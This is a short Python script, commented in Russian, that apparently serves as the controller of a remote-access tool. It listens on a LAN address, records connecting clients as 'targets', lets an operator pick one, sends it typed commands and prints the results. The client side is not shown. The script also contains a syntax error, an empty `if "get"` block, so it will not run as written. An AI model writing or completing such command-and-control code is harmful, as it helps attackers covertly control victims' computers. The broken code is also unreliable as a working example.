def applyUsers():
    global x
    while True:
        con, c2 = server.accept()  # принимаем клиента
        data = con.recv(1024)  # получаем данные от клиента
        message = data.decode()  # преобразуем байты в строку
        x[message] = con
#        print(con)
#        print(message, con, c2)
#        print()
#        print()
#        print()
#        for i in x:
#            print(f"{i}  {x[i]}")
#        with open("users.pkl","wb") as file:
#            pickle.dump(x,file)
#def getUsersFromFile():
#    with open("users.pkl","rb") as file:
#        return pickle.load(file)
import threading
x={}
import socket
import pickle
target=None

server = socket.socket()  # создаем объект сокета сервера
hostname = socket.gethostname()  # получаем имя хоста локальной машины
port = 12346  # устанавливаем порт сервера
server.bind(('192.168.1.13', port))  # привязываем сокет сервера к хосту и порту
server.listen(5)  # начинаем прослушиваение входящих подключений
print("Server running")
#users=getUsersFromFile()
chUs=threading.Thread(target=applyUsers)
chUs.start()
tr=""
while True:
    while not tr in x:
        c = 0
        for i in x:
            print(f"{c} {i}")
            c += 1
        tr=input("Select target:")
        print()
    command=input("Write your command: ")
    if "get" in command:
        
    x[tr].send(command.encode())
    res=x[tr].recv(1024).decode()
    print(res)